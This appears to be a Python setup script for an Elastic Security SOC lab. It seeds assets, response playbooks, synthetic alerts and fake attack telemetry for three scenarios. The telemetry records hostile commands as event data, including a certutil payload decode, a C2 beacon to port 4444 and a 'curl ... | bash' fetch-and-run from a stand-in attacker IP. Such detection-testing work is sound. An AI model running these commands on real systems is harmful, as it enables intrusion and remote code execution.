#!/usr/bin/env python3

import os, json, time, uuid, random
from datetime import datetime, timedelta
from dotenv import load_dotenv
from elasticsearch import Elasticsearch
from elasticsearch.helpers import bulk
from sentence_transformers import SentenceTransformer

load_dotenv()

# ── CONNECT ──────────────────────────────────────────────────────────────────
# Get these from Elastic Cloud console → Deployment → Copy endpoint
es = Elasticsearch(
    os.environ["ELASTIC_CLOUD_URL"],          # e.g. https://abc123.es.us-east-1.aws.elastic-cloud.com
    api_key=os.environ["ELASTIC_API_KEY"],    # Create in Kibana → Stack Management → API Keys
    verify_certs=True
)

print(f"Connected: {es.info()['cluster_name']}")
model = SentenceTransformer("all-MiniLM-L6-v2")

# ─────────────────────────────────────────────────────────────────────────────
# STEP 1 — CREATE INDICES
# ─────────────────────────────────────────────────────────────────────────────

PLAYBOOK_MAPPING = {
    "mappings": {
        "properties": {
            "playbook_id":      {"type": "keyword"},
            "title":            {"type": "text"},
            "version":          {"type": "keyword"},
            "mitre_techniques": {"type": "keyword"},
            "severity_scope":   {"type": "keyword"},
            "last_validated":   {"type": "date"},
            "validated_by":     {"type": "keyword"},
            "trigger_context":  {"type": "text"},
            "trigger_vector": {
                "type": "dense_vector",
                "dims": 384,
                "index": True,
                "similarity": "cosine"
            },
            "steps":            {"type": "object", "enabled": False},
            "required_tools":   {"type": "keyword"},
            "execution_count":  {"type": "integer"},
            "success_rate":     {"type": "float"},
            "avg_duration_mins":{"type": "float"},
            "needs_revalidation":{"type": "boolean"},
            "last_outcome":     {"type": "keyword"}
        }
    }
}

ASSET_MAPPING = {
    "mappings": {
        "properties": {
            "identity":       {"type": "keyword"},
            "host":           {"type": "keyword"},
            "criticality":    {"type": "keyword"},   # low/medium/high/critical
            "department":     {"type": "keyword"},
            "privileged":     {"type": "boolean"},
            "tags":           {"type": "keyword"}
        }
    }
}

AGENT_LOG_MAPPING = {
    "mappings": {
        "properties": {
            "@timestamp":       {"type": "date"},
            "alert_id":         {"type": "keyword"},
            "playbook_id":      {"type": "keyword"},
            "playbook_title":   {"type": "text"},
            "step_id":          {"type": "keyword"},
            "step_type":        {"type": "keyword"},
            "status":           {"type": "keyword"},
            "confidence":       {"type": "float"},
            "tool_invoked":     {"type": "keyword"},
            "action_taken":     {"type": "keyword"},
            "duration_ms":      {"type": "integer"},
            "escalated":        {"type": "boolean"},
            "outcome":          {"type": "keyword"},
            "host":             {"type": "keyword"},
            "user":             {"type": "keyword"},
            "case_id":          {"type": "keyword"},
            "notes":            {"type": "text"}
        }
    }
}

for idx, mapping in [
    ("soc_playbooks",    PLAYBOOK_MAPPING),
    ("asset_inventory",  ASSET_MAPPING),
    ("soc_agent_log",    AGENT_LOG_MAPPING),
]:
    if not es.indices.exists(index=idx):
        es.indices.create(index=idx, body=mapping)
        print(f"  ✓ Created index: {idx}")
    else:
        print(f"  ↩ Index exists: {idx}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 2 — SEED ASSET INVENTORY
# ─────────────────────────────────────────────────────────────────────────────

ASSETS = [
    {"identity": "jsmith",         "host": "ws-jsmith-001",    "criticality": "medium",   "department": "Engineering",  "privileged": False, "tags": ["developer"]},
    {"identity": "admin-svc",      "host": "ldap-prod-01",     "criticality": "critical", "department": "IT",           "privileged": True,  "tags": ["service-account","ldap"]},
    {"identity": "svc-backup",     "host": "backup-srv-02",    "criticality": "high",     "department": "IT",           "privileged": True,  "tags": ["service-account","backup"]},
    {"identity": "agarcia",        "host": "ws-agarcia-003",   "criticality": "high",     "department": "Finance",      "privileged": False, "tags": ["finance","sensitive-data"]},
    {"identity": "devops-deploy",  "host": "ci-runner-07",     "criticality": "critical", "department": "DevOps",       "privileged": True,  "tags": ["service-account","ci-cd"]},
]

bulk(es, [{"_index": "asset_inventory", "_id": a["identity"], "_source": a} for a in ASSETS])
print(f"  ✓ Seeded {len(ASSETS)} assets")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 3 — INJECT SYNTHETIC ATTACK TELEMETRY
# Each scenario generates events that will trigger Elastic Security rules
# ─────────────────────────────────────────────────────────────────────────────

def now_minus(minutes):
    return (datetime.utcnow() - timedelta(minutes=minutes)).strftime("%Y-%m-%dT%H:%M:%S.000Z")

def gen_id():
    return str(uuid.uuid4())

SYNTHETIC_EVENTS = []

# ── SCENARIO 1: Impossible Travel ────────────────────────────────────────────
# jsmith logs in from London, then 8 minutes later from Russia
# This fires: "Unusual Login Activity" and "Geographic Impossibility" rules

# Good login from London
SYNTHETIC_EVENTS.append({
    "@timestamp": now_minus(20),
    "event": {"category": ["authentication"], "type": ["start"], "outcome": "success", "id": gen_id()},
    "user": {"name": "jsmith", "id": "S-1-5-21-100"},
    "source": {"ip": "81.2.69.142", "geo": {"country_name": "United Kingdom", "city_name": "London"}},
    "host": {"name": "auth-gateway-01", "os": {"type": "windows"}},
    "process": {"name": "winlogon.exe"},
    "event.action": "logged-in",
    "tags": ["lab-synthetic", "scenario-impossible-travel"]
})

# 8 minutes later from Russia — impossible travel
SYNTHETIC_EVENTS.append({
    "@timestamp": now_minus(12),
    "event": {"category": ["authentication"], "type": ["start"], "outcome": "success", "id": gen_id()},
    "user": {"name": "jsmith", "id": "S-1-5-21-100"},
    "source": {"ip": "45.33.32.156", "geo": {"country_name": "Russia", "city_name": "Moscow"}},
    "host": {"name": "auth-gateway-01", "os": {"type": "windows"}},
    "process": {"name": "winlogon.exe"},
    "event.action": "logged-in",
    "tags": ["lab-synthetic", "scenario-impossible-travel"]
})

# Follow-on LDAP queries from the suspicious IP — lateral recon
for i in range(5):
    SYNTHETIC_EVENTS.append({
        "@timestamp": now_minus(11 - i),
        "event": {"category": ["authentication"], "type": ["info"], "outcome": "success"},
        "user": {"name": "jsmith"},
        "source": {"ip": "45.33.32.156"},
        "host": {"name": "ldap-prod-01"},
        "network": {"protocol": "ldap", "direction": "ingress"},
        "destination": {"port": 389},
        "tags": ["lab-synthetic", "scenario-impossible-travel", "lateral-recon"]
    })

# ── SCENARIO 2: LOLBin — CertUtil Payload Decode ─────────────────────────────
# winword.exe spawns certutil.exe to decode a base64 payload
# Fires: "Suspicious CertUtil Usage", "Office Application Spawning Script"

SYNTHETIC_EVENTS.append({
    "@timestamp": now_minus(45),
    "event": {"category": ["process"], "type": ["start"], "id": gen_id()},
    "process": {
        "name": "certutil.exe",
        "pid": 4821,
        "executable": "C:\\Windows\\System32\\certutil.exe",
        "args": ["certutil.exe", "-decode", "update.b64", "payload.exe"],
        "command_line": "certutil.exe -decode update.b64 payload.exe",
        "working_directory": "C:\\Users\\agarcia\\Downloads",
        "parent": {
            "name": "winword.exe",
            "pid": 3201,
            "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
        }
    },
    "user": {"name": "agarcia"},
    "host": {"name": "ws-agarcia-003", "os": {"type": "windows"}},
    "tags": ["lab-synthetic", "scenario-lolbin", "certutil-decode"]
})

# certutil writes an executable to disk
SYNTHETIC_EVENTS.append({
    "@timestamp": now_minus(44),
    "event": {"category": ["file"], "type": ["creation"]},
    "file": {
        "name": "payload.exe",
        "path": "C:\\Users\\agarcia\\Downloads\\payload.exe",
        "extension": "exe"
    },
    "process": {"name": "certutil.exe", "pid": 4821},
    "user": {"name": "agarcia"},
    "host": {"name": "ws-agarcia-003"},
    "tags": ["lab-synthetic", "scenario-lolbin", "file-write-exe"]
})

# payload.exe executes and makes a network connection
SYNTHETIC_EVENTS.append({
    "@timestamp": now_minus(43),
    "event": {"category": ["network", "process"], "type": ["connection", "start"]},
    "process": {"name": "payload.exe", "pid": 5102, "executable": "C:\\Users\\agarcia\\Downloads\\payload.exe"},
    "destination": {"ip": "185.220.101.45", "port": 4444, "geo": {"country_name": "Netherlands"}},
    "network": {"direction": "egress", "protocol": "tcp"},
    "user": {"name": "agarcia"},
    "host": {"name": "ws-agarcia-003"},
    "tags": ["lab-synthetic", "scenario-lolbin", "c2-beacon"]
})

# ── SCENARIO 3: Brute Force → Valid Account Takeover ─────────────────────────
# 47 failed logins in 3 minutes, then success

for i in range(47):
    SYNTHETIC_EVENTS.append({
        "@timestamp": now_minus(90 + i * 0.06),
        "event": {"category": ["authentication"], "type": ["start"], "outcome": "failure"},
        "user": {"name": "devops-deploy"},
        "source": {"ip": "198.51.100.22", "geo": {"country_name": "Romania"}},
        "host": {"name": "ci-runner-07"},
        "error": {"message": "Invalid credentials"},
        "tags": ["lab-synthetic", "scenario-bruteforce"]
    })

# Successful login after brute force
SYNTHETIC_EVENTS.append({
    "@timestamp": now_minus(87),
    "event": {"category": ["authentication"], "type": ["start"], "outcome": "success"},
    "user": {"name": "devops-deploy"},
    "source": {"ip": "198.51.100.22", "geo": {"country_name": "Romania"}},
    "host": {"name": "ci-runner-07"},
    "tags": ["lab-synthetic", "scenario-bruteforce", "successful-after-bruteforce"]
})

# Immediately triggers CI/CD pipeline with malicious env vars
SYNTHETIC_EVENTS.append({
    "@timestamp": now_minus(86),
    "event": {"category": ["process"], "type": ["start"]},
    "process": {
        "name": "sh",
        "command_line": "sh -c 'curl http://198.51.100.22:8080/exfil | bash'",
        "parent": {"name": "gitlab-runner"}
    },
    "user": {"name": "devops-deploy"},
    "host": {"name": "ci-runner-07"},
    "tags": ["lab-synthetic", "scenario-bruteforce", "pipeline-hijack"]
})

# Bulk index all synthetic events into the correct ECS datastream
bulk_actions = [
    {
        "_index": "logs-endpoint.events.security-default",
        "_source": event
    }
    for event in SYNTHETIC_EVENTS
]

success, errors = bulk(es, bulk_actions, raise_on_error=False)
print(f"  ✓ Injected {success} synthetic attack events ({len(errors)} errors)")

if errors:
    # Fall back to standard index if datastream not available
    bulk_actions_fallback = [
        {"_index": "logs-lab-security", "_source": event}
        for event in SYNTHETIC_EVENTS
    ]
    success2, _ = bulk(es, bulk_actions_fallback, raise_on_error=False)
    print(f"  ↩ Fallback: indexed {success2} events to logs-lab-security")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 4 — SEED VECTORIZED PLAYBOOK LIBRARY
# ─────────────────────────────────────────────────────────────────────────────

PLAYBOOKS = [
    {
        "playbook_id": "PB-001",
        "title": "Credential Abuse — Impossible Travel / Unusual Authentication",
        "version": "2.1",
        "mitre_techniques": ["T1078", "T1110"],
        "severity_scope": ["medium", "high", "critical"],
        "last_validated": "2024-11-15",
        "validated_by": "threat-hunt-team",
        "trigger_context": (
            "A user or service account authenticated successfully from an unusual "
            "geographic location, unknown IP address, or at an unusual time. "
            "Valid credentials were used. Possible impossible travel between two logins, "
            "direct access to sensitive internal resources without VPN, or LDAP/Kerberos "
            "activity from an unexpected source host or foreign country."
        ),
        "steps": [
            {"step_id": "S1", "name": "Gather 30-day auth history", "type": "query",
             "tool": "elasticsearch",
             "query_template": {"index": "logs-*", "filter": {
                 "bool": {"must": [
                     {"term": {"user.name": "{{alert.user.name}}"}},
                     {"term": {"event.category": "authentication"}},
                     {"range": {"@timestamp": {"gte": "now-30d"}}}
                 ]}}},
             "output_field": "auth_history", "next_step": "S2"},
            {"step_id": "S2", "name": "Check asset criticality", "type": "query",
             "tool": "elasticsearch",
             "query_template": {"index": "asset_inventory", "filter": {"term": {"identity": "{{alert.user.name}}"}}},
             "output_field": "asset_profile", "next_step": "D1"},
            {"step_id": "D1", "name": "Triage: Impossible travel confirmed?", "type": "decision",
             "description": "Compare current login geolocation vs last known good login. If physical travel time is impossible, classify as impossible travel. Check if source IP is known VPN/proxy.",
             "conditions": [
                 {"condition": "impossible_travel_confirmed", "next_step": "A1", "label": "Confirmed impossible travel → immediate containment"},
                 {"condition": "vpn_or_proxy_detected",      "next_step": "A2", "label": "VPN/proxy likely → challenge and monitor"},
                 {"condition": "within_normal_baseline",     "next_step": "A3", "label": "Within baseline → low risk, document and close"}
             ]},
            {"step_id": "A1", "name": "Disable account + revoke sessions", "type": "action",
             "tool": "identity_provider", "action": "disable_user",
             "parameters": {"user_id": "{{alert.user.name}}", "revoke_sessions": True,
                            "reason": "Impossible travel — automated SOC response PB-001"},
             "requires_confidence": 0.85, "next_step": "A4"},
            {"step_id": "A2", "name": "Force MFA re-auth", "type": "action",
             "tool": "identity_provider", "action": "force_mfa_challenge",
             "parameters": {"user_id": "{{alert.user.name}}"}, "next_step": "A4"},
            {"step_id": "A3", "name": "Document and close", "type": "action",
             "tool": "elasticsearch", "action": "update_alert",
             "parameters": {"status": "closed", "resolution": "false_positive"}, "next_step": None},
            {"step_id": "A4", "name": "Create Elastic Security Case", "type": "action",
             "tool": "elastic_security", "action": "create_case",
             "parameters": {"title": "Credential Abuse — {{alert.user.name}} — Impossible Travel",
                            "severity": "{{alert.severity}}", "assignee": "tier2-team",
                            "tags": ["credential-abuse","impossible-travel","pb-001"]},
             "next_step": None}
        ],
        "required_tools": ["elasticsearch", "identity_provider", "elastic_security"],
        "execution_count": 0, "success_rate": 0.0, "avg_duration_mins": 0.0
    },
    {
        "playbook_id": "PB-002",
        "title": "LOLBin Execution — Office Application Spawning System Binary",
        "version": "1.5",
        "mitre_techniques": ["T1140", "T1218", "T1059"],
        "severity_scope": ["high", "critical"],
        "last_validated": "2024-10-22",
        "validated_by": "red-team",
        "trigger_context": (
            "An Office application such as Word, Excel, or PowerPoint spawned a "
            "system binary like certutil, mshta, regsvr32, rundll32, or wmic. "
            "The spawned process executed with suspicious arguments including base64 decode, "
            "remote URL fetch, script execution, or file write to user-writable directory. "
            "Possible payload staging, macro execution, or living-off-the-land attack chain."
        ),
        "steps": [
            {"step_id": "S1", "name": "Check for child process chain", "type": "query",
             "tool": "elasticsearch",
             "query_template": {"index": "logs-endpoint.events.*", "filter": {
                 "bool": {"must": [
                     {"term": {"host.name": "{{alert.host.name}}"}},
                     {"range": {"@timestamp": {"gte": "now-1h"}}},
                     {"terms": {"event.category": ["process", "file", "network"]}}
                 ]}}},
             "output_field": "process_chain", "next_step": "D1"},
            {"step_id": "D1", "name": "Has payload executed and beaconed?", "type": "decision",
             "description": "Review process_chain for: executable file written to disk, new process spawned from Downloads/Temp, outbound network connection to non-corporate IP. Severity escalates if all three present.",
             "conditions": [
                 {"condition": "full_chain_c2_beacon",    "next_step": "A1", "label": "Payload executed + C2 beacon → isolate immediately"},
                 {"condition": "payload_staged_no_exec",  "next_step": "A2", "label": "Payload written but not executed → quarantine file"},
                 {"condition": "suspicious_no_payload",   "next_step": "A3", "label": "Suspicious parent-child only → monitor and alert"}
             ]},
            {"step_id": "A1", "name": "Network isolate host", "type": "action",
             "tool": "elastic_agent", "action": "isolate_host",
             "parameters": {"host": "{{alert.host.name}}", "allow_edr_comms": True,
                            "reason": "LOLBin + C2 beacon confirmed — PB-002"},
             "requires_confidence": 0.80, "next_step": "A4"},
            {"step_id": "A2", "name": "Quarantine malicious file", "type": "action",
             "tool": "elastic_agent", "action": "kill_process_and_quarantine",
             "parameters": {"host": "{{alert.host.name}}", "process": "{{alert.process.name}}",
                            "file_path": "{{alert.process.working_directory}}"},
             "next_step": "A4"},
            {"step_id": "A3", "name": "Elevate alert + monitor", "type": "action",
             "tool": "elasticsearch", "action": "update_alert",
             "parameters": {"severity": "high", "tags": ["elevated-by-agent", "lolbin-watch"]},
             "next_step": "A4"},
            {"step_id": "A4", "name": "Create P1 IR case", "type": "escalate",
             "tool": "elastic_security", "action": "create_case",
             "parameters": {"title": "LOLBin Execution — {{alert.host.name}} — {{alert.process.name}}",
                            "priority": "P1", "assignee": "incident-response",
                            "tags": ["lolbin","macro-execution","pb-002"]},
             "next_step": None}
        ],
        "required_tools": ["elasticsearch", "elastic_agent", "elastic_security"],
        "execution_count": 0, "success_rate": 0.0, "avg_duration_mins": 0.0
    },
    {
        "playbook_id": "PB-003",
        "title": "Brute Force Attack — Credential Stuffing with Successful Compromise",
        "version": "1.2",
        "mitre_techniques": ["T1110", "T1110.001", "T1078"],
        "severity_scope": ["medium", "high", "critical"],
        "last_validated": "2024-12-01",
        "validated_by": "soc-team",
        "trigger_context": (
            "Multiple consecutive authentication failures against a single account "
            "or multiple accounts from the same source IP, followed by or coinciding with "
            "a successful authentication. High velocity login attempts from unknown IP, "
            "foreign country, or known credential stuffing infrastructure. "
            "Threshold exceeded: more than 20 failures in 5 minutes."
        ),
        "steps": [
            {"step_id": "S1", "name": "Quantify brute force scope", "type": "query",
             "tool": "elasticsearch",
             "query_template": {"index": "logs-*", "filter": {
                 "bool": {"must": [
                     {"term": {"source.ip": "{{alert.source.ip}}"}},
                     {"term": {"event.outcome": "failure"}},
                     {"range": {"@timestamp": {"gte": "now-30m"}}}
                 ]}}},
             "output_field": "bruteforce_scope", "next_step": "S2"},
            {"step_id": "S2", "name": "Check for successful logins from same IP", "type": "query",
             "tool": "elasticsearch",
             "query_template": {"index": "logs-*", "filter": {
                 "bool": {"must": [
                     {"term": {"source.ip": "{{alert.source.ip}}"}},
                     {"term": {"event.outcome": "success"}},
                     {"range": {"@timestamp": {"gte": "now-30m"}}}
                 ]}}},
             "output_field": "successful_logins", "next_step": "D1"},
            {"step_id": "D1", "name": "Was any account compromised?", "type": "decision",
             "description": "Check successful_logins count. If > 0, account was compromised after bruteforce. Check which accounts succeeded and their criticality from asset_inventory.",
             "conditions": [
                 {"condition": "account_compromised",    "next_step": "A1", "label": "Compromise confirmed → disable accounts + block IP"},
                 {"condition": "ongoing_no_compromise",  "next_step": "A2", "label": "Still ongoing → block IP + rate limit"},
                 {"condition": "bruteforce_failed",      "next_step": "A3", "label": "Attacker failed → block IP + document"}
             ]},
            {"step_id": "A1", "name": "Disable compromised accounts + block IP", "type": "action",
             "tool": "identity_provider", "action": "disable_users_and_block_ip",
             "parameters": {"users": "{{successful_logins.users}}", "block_ip": "{{alert.source.ip}}",
                            "reason": "Brute force compromise confirmed — PB-003"},
             "requires_confidence": 0.82, "next_step": "A4"},
            {"step_id": "A2", "name": "Block source IP at perimeter", "type": "action",
             "tool": "network_firewall", "action": "block_ip",
             "parameters": {"ip": "{{alert.source.ip}}", "duration_hours": 24}, "next_step": "A4"},
            {"step_id": "A3", "name": "Block IP + document attempt", "type": "action",
             "tool": "network_firewall", "action": "block_ip",
             "parameters": {"ip": "{{alert.source.ip}}", "duration_hours": 12}, "next_step": "A4"},
            {"step_id": "A4", "name": "Create Security Case", "type": "action",
             "tool": "elastic_security", "action": "create_case",
             "parameters": {"title": "Brute Force — {{alert.source.ip}} — {{alert.user.name}}",
                            "severity": "{{alert.severity}}", "assignee": "tier2-team",
                            "tags": ["brute-force","credential-stuffing","pb-003"]},
             "next_step": None}
        ],
        "required_tools": ["elasticsearch", "identity_provider", "network_firewall", "elastic_security"],
        "execution_count": 0, "success_rate": 0.0, "avg_duration_mins": 0.0
    }
]

# Embed and index playbooks
pb_actions = []
for pb in PLAYBOOKS:
    vec = model.encode(pb["trigger_context"], normalize_embeddings=True).tolist()
    pb_actions.append({
        "_index": "soc_playbooks",
        "_id": pb["playbook_id"],
        "_source": {**pb, "trigger_vector": vec}
    })

bulk(es, pb_actions)
print(f"  ✓ Indexed {len(PLAYBOOKS)} vectorized playbooks")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 5 — CREATE SYNTHETIC ELASTIC SECURITY ALERTS
# (Since we can't trigger real detection rules in setup,
#  we inject realistic alert documents that match the .alerts schema)
# ─────────────────────────────────────────────────────────────────────────────

SYNTHETIC_ALERTS = [
    {
        "@timestamp": now_minus(12),
        "kibana.alert.rule.name":     "Impossible Travel — Authentication from Two Countries",
        "kibana.alert.rule.category": "SIEM",
        "kibana.alert.severity":      "high",
        "kibana.alert.risk_score":    73,
        "kibana.alert.workflow_status": "open",
        "kibana.alert.reason": (
            "User jsmith authenticated from Russia (45.33.32.156) 8 minutes after "
            "successful login from United Kingdom (81.2.69.142). Physical travel impossible."
        ),
        "threat.tactic.name":    "Credential Access",
        "threat.technique.id":   "T1078",
        "threat.technique.name": "Valid Accounts",
        "user.name":             "jsmith",
        "host.name":             "auth-gateway-01",
        "source.ip":             "45.33.32.156",
        "source.geo.country_name": "Russia",
        "event.category":        "authentication",
        "tags": ["lab-synthetic", "scenario-impossible-travel"]
    },
    {
        "@timestamp": now_minus(44),
        "kibana.alert.rule.name":     "Office Application Spawned System Binary",
        "kibana.alert.rule.category": "SIEM",
        "kibana.alert.severity":      "critical",
        "kibana.alert.risk_score":    91,
        "kibana.alert.workflow_status": "open",
        "kibana.alert.reason": (
            "winword.exe (PID 3201) spawned certutil.exe with -decode argument "
            "on host ws-agarcia-003. Payload written to Downloads directory. "
            "Subsequent network connection to 185.220.101.45:4444 (Netherlands)."
        ),
        "threat.tactic.name":    "Defense Evasion",
        "threat.technique.id":   "T1140",
        "threat.technique.name": "Deobfuscate/Decode Files or Information",
        "user.name":             "agarcia",
        "host.name":             "ws-agarcia-003",
        "process.name":          "certutil.exe",
        "process.command_line":  "certutil.exe -decode update.b64 payload.exe",
        "process.parent.name":   "winword.exe",
        "event.category":        "process",
        "tags": ["lab-synthetic", "scenario-lolbin"]
    },
    {
        "@timestamp": now_minus(87),
        "kibana.alert.rule.name":     "High Volume Authentication Failures Followed by Success",
        "kibana.alert.rule.category": "SIEM",
        "kibana.alert.severity":      "high",
        "kibana.alert.risk_score":    78,
        "kibana.alert.workflow_status": "open",
        "kibana.alert.reason": (
            "47 authentication failures for devops-deploy from 198.51.100.22 (Romania) "
            "in 3 minutes, followed by successful authentication. CI/CD pipeline "
            "subsequently executed suspicious curl | bash command."
        ),
        "threat.tactic.name":    "Credential Access",
        "threat.technique.id":   "T1110",
        "threat.technique.name": "Brute Force",
        "user.name":             "devops-deploy",
        "host.name":             "ci-runner-07",
        "source.ip":             "198.51.100.22",
        "source.geo.country_name": "Romania",
        "event.category":        "authentication",
        "tags": ["lab-synthetic", "scenario-bruteforce"]
    }
]

# Index into a queryable alerts index
# (In real Elastic Security these live in .alerts-security.alerts-default)
alert_actions = [
    {"_index": "soc-lab-alerts", "_id": f"alert-{i:03d}", "_source": a}
    for i, a in enumerate(SYNTHETIC_ALERTS)
]
bulk(es, alert_actions)

# Also try writing to real .alerts index (may require specific privileges)
try:
    real_alert_actions = [
        {"_index": ".internal.alerts-security.alerts-default-000001",
         "_source": a} for a in SYNTHETIC_ALERTS
    ]
    bulk(es, real_alert_actions, raise_on_error=True)
    print(f"  ✓ Injected {len(SYNTHETIC_ALERTS)} alerts to real Elastic Security index")
except Exception:
    print(f"  ✓ Injected {len(SYNTHETIC_ALERTS)} alerts to soc-lab-alerts (use this index for demo)")

print("\n" + "="*60)
print("LAB SETUP COMPLETE")
print("="*60)
print(f"  Indices created:     soc_playbooks, asset_inventory, soc_agent_log, soc-lab-alerts")
print(f"  Playbooks indexed:   {len(PLAYBOOKS)}")
print(f"  Synthetic events:    {len(SYNTHETIC_EVENTS)}")
print(f"  Synthetic alerts:    {len(SYNTHETIC_ALERTS)}")
print(f"\n  Next step: python 01_mcp_server.py")
print("="*60)
